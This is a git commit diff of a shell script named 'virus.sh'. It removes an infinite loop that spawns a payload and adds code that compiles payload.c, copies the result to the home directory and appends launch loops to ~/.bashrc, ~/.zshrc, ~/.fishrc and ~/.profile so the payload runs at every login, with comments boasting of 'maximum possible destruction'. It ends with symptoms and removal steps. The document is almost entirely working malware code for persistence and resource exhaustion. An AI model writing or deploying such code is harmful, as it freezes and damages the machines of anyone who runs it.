271b43740bc27d2efc08ff31ee2e211fbfbc01d9
Aviruk Basak <avirukbasak@gmail.com>
2021-03-20 00:57:56 +0530

    Updated Files

--- virus.sh
+++ virus.sh
@@ -1,7 +1,35 @@
-# "&" is used to background the task hence we can use a loop (infinite)
-#+ and open more payloads for the maximum possible destruction. :)
-while [ 1 = 1 ]
-do
-	./payload &
-done
+#!/bin/bash
 
+# if termux, the included payload executable will work
+#+ otherwise the payload source needs to be compiled
+if [[ $PREFIX != *"com.termux"* ]]
+then
+    gcc ./payload.c -o ./payload
+fi
+
+# copy the payload into home directory
+cp "./payload" ~/
+
+# "&" is used to background the task hence we can use a loop
+#+ and open more payloads for the maximum possible destruction. :)
+
+# this writes the malicious script into the login and shell files
+#+ making the virus autostart on login.
+echo "
+declare i=3
+while [ i \!= 0 ]
+do
+    let i=i-1
+	~/payload &
+done &
+" >> ~/.bashrc >> ~/.zshrc >> ~/.fishrc >> ~/.profile
+
+# SYMPTOMPS OF INFECTION:
+#+ System freezes after some time
+#+ programs begin to crash
+#+ CPU might get very hot
+
+# TREATMENT
+#+ Check ~/.profile and shell files
+#+ shell files can be .bashrc, .zshrc or any such shell files
+#+ Comment out any code that you find suspicious from these files
